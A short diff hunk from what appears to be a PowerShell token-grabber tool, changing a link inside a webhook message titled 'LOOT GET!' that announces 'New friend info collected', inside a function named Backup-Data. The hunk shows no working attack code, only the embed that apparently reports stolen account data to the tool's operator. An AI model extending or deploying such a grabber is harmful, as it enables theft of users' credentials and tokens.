@@ -668,7 +668,7 @@ function Backup-Data {
         "embeds" = @(
             @{
                 "title" = "LOOT GET!"
-		"url" = "https://www.youtube.com/watch?v=t8KqCp76qqQ"
+		"url" = "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/tree/main"
                 "description" = "New friend info collected !"
                 "color" = "3447003"
                 "footer" = @{
